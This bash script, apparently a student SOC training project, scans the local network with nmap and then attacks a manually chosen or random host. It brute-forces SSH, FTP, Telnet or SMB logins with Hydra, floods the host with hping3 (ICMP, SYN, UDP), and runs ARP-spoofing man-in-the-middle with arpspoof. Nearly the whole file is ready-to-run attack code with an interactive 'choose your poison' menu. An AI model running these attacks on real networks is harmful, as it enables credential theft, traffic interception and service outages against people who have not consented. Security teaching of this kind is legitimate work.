#!/bin/bash

#Author - Liray Spilberg
#Lecturer - Eliran Berkovich

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Welcome to the SOC-CHECKER!!${NC}"
echo -e "${RED}
                                   .''.       
       .''.      .        *''*    :_\/_:     . 
      :_\/_:   _\(/_  .:.*_\/_*   : /\ :  .'.:.'.
  .''.: /\ :   ./)\   ':'* /\ * :  '..'.  -=:o:=-
 :_\/_:'.:::.    ' *''*    * '.\'/.' _\(/_'.':'.'
 : /\ : :::::     *_\/_*     -= o =-  /)\    '  *
  '..'  ':::'     * /\ *     .'/.\'.   '
      *            *..*         :
jgs     *
        *"

echo -e "${GREEN}The script will demonstrate LAN scanning and attacks on the network.${NC}"

# Function to check if the script is run as root
CheckForROOT () {
    if [[ $(id -u) -ne 0 ]]; 
        then
            echo -e "${RED}Please run the script with sudo privileges!${NC}"
            exit 1
    fi
}

CheckForROOT


echo -e "${YELLOW}NOTICE!! nmap scan on LAN will start in 3...${NC}"
sleep 1
echo -e "${YELLOW}2...${NC}"
sleep 1
echo -e "${YELLOW}1...${NC}"
sleep 1


ntip=$(ip a | grep -A 4 eth1 | grep -w inet | awk '{print $2}')

# Function to perform network scan
# Function to perform network scan
NetworkScan () {
    echo -e "${GREEN}[+]Starting nmap scan now!!!${NC}"
    mkdir -p reports  
    nmap -Pn -sC "$ntip" -oN reports/scan_results.txt -oX reports/scan_results.xml
    cat reports/scan_results.txt | grep -s -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | uniq >> reports/IPv4_list.txt
}

NetworkScan

BruteForce() {
    echo -e "${GREEN}[+]Brute Force it is!${NC}"
    read -p "Please choose the service you want to attack (1-4):
    1) SSH
    2) FTP
    3) Telnet
    4) SMB: " attacked_service

    if [[ $attacked_service == "1" ]]; 
        then
            service="ssh"
    elif [[ $attacked_service == "2" ]]; 
        then
            service="ftp"
    elif [[ $attacked_service == "3" ]]; 
        then
            service="telnet"
    elif [[ $attacked_service == "4" ]]; 
        then
            service="smb"
        else
            echo -e "${RED}Invalid option. Exiting...${NC}" 
            && 
            return 1
    fi

    echo -e "${GREEN}[+]You have chosen to attack $IP on $service.${NC}"
    echo -e "${GREEN}[+]Let's proceed to wordlists...${NC}"
    read -p "Please enter the full path for your users list: " users_list
    read -p "Please enter the full path for your password list: " pass_list

    echo -e "${YELLOW}[+]You chose:${NC}"
    echo -e "${YELLOW}[+]User list as: $users_list${NC}"
    echo -e "${YELLOW}[+]Password list as: $pass_list${NC}"

    read -p "Would you like to proceed or correct? (1/2): " lists_ans

    if [[ $lists_ans == "2" ]]; 
        then 
            read -p "Please enter the full path for your users list: " users_list
            read -p "Please enter the full path for your password list: " pass_list
            echo -e "${YELLOW}[+]You chose:${NC}"
            echo -e "${YELLOW}[+]User list as: $users_list${NC}"
            echo -e "${YELLOW}[+]Password list as: $pass_list${NC}"
    fi

    echo -e "${GREEN}[+]Starting brute force attack now...${NC}"
    hydra -t 4 -L "$users_list" -P "$pass_list" "$IP" "$service" | tee reports/brute_force_attack_$service.txt

}

# Function to perform Denial of Service attack
DenialOfService () {
    read -p "You have chosen a Denial of Service attack! Please choose the type of attack (1-3):
    1) ICMP flood attack
    2) SYN flood attack 
    3) UDP flood attack: 
    Enter answer here:" ddos_type

    case $ddos_type in
        1)
            echo -e "${GREEN}You chose ICMP flood attack. Starting now...${NC}"
            sudo hping3 -c 10000000 -d 500 -1  $IP | tee reports/icmp_flood_attack.txt
            ;;
        2)
            echo -e "${GREEN}[+]You chose SYN flood attack.${NC}"
            read -p "Please choose the desired port of the service you would like to attack: " ddos_port
            sudo hping3 -c 10000000 -d 120 -S -w 500 -p $ddos_port --flood $IP | tee reports/syn_flood_attack.txt
            ;;
        3)
            echo -e "${GREEN}[+]You chose UDP flood attack! Starting now...${NC}"
            sudo hping3 -c 10000000 -2 $IP | tee reports/udp_flood_attack.txt
            ;;
        *)
            echo -e "${RED}Invalid option. Exiting...${NC}"
            return 1
            ;;
    esac
}

# Function to perform Man-in-the-Middle attack
MITM () {
    echo -e "${GREEN}[+]You chose Man In The Middle attack!${NC}"
    read -p "Please enter the network interface you would like to use for the attack: " interface
    read -p "Please enter the IP address of the gateway: " gwip
    echo -e "${GREEN}[+]Starting now...${NC}"
    sudo arpspoof -i $interface -c both -t $IP $gwip | tee reports/mitm_attack.txt
}

# Function to display user menu and handle user input
usermenu() {
    echo -e "${YELLOW}[+]Your current network IP is $ntip.${NC}"
    echo -e "The script will be able to attack as follows:"
    echo -e "${RED}1)Brute force attack${NC} - A hacking method that uses trial and error to crack passwords, login credentials, and encryption keys"
    echo -e "${RED}2)MITM attack${NC}- An impersonation or eavesdropping position within the network"
    echo -e "${RED}3)DoS attack${NC}- Denial of service on services using an overwhelming amount of traffic"
    echo -e "${RED}4)Surprise me package${NC} - Random choice"
    read -p "Choose your poison: " cattack


    chosen_attack
}


# Function to execute chosen attack based on user input
chosen_attack() {
    while true; 
        do
            if [[ $cattack == "4" ]]; 
                then 
                    cattack=$((RANDOM %3 + 1))

            elif [[ $cattack == "1" ]]; 
                then
                    cattack="bf"
                    BruteForce

            elif [[ $cattack == "2" ]]; 
                then  
                    cattack="mitm"
                    MITM
        
            elif [[ $cattack == "3" ]]; 
                then
                    cattack="dos"
                    DenialOfService
                else
                    echo "Invalid option. Please choose a valid option"
                    read -p "Choose your poison (1-4): " cattack
                continue  # Continue the loop to prompt user for input again
            fi
        break  # Break out of the loop once a valid option is selected
    done
}



# Function to choose victim IP
chosen_IP() {
while true; 
    do
        read -p "How would you like to choose your victim? Please enter the number of the preferred way:
                1) Enter manually
                2) Choose random IP from nmap scan results: 
                Enter answer here: " ip_way

    if [[ $ip_way == "1" ]]; 
        then
            cat reports/IPv4_list.txt
            read -p "Enter IP here: " IP
        break  # Exit the loop after IP is entered manually
    elif [[ $ip_way == "2" ]]; 
        then
            mapfile -t ips < reports/IPv4_list.txt
            if [[ ${#ips[@]} -eq 0 ]]; 
                then
                    echo -e "${RED}No IP addresses available in the list.${NC}"
                continue  # Restart the loop if no IPs available
            fi
        rand_index=$(( RANDOM % ${#ips[@]} ))
        IP="${ips[rand_index]}"
        echo -e "${GREEN}[+]Randomly selected IP: $IP${NC}"
        break  # Exit the loop after selecting a random IP
        else
            echo -e "${RED}Invalid option. Please choose either 1 or 2.${NC}"
    fi
done
}


# Run the functions
chosen_IP
usermenu

# End message
echo -e "${GREEN}[+]Script execution completed.${NC}"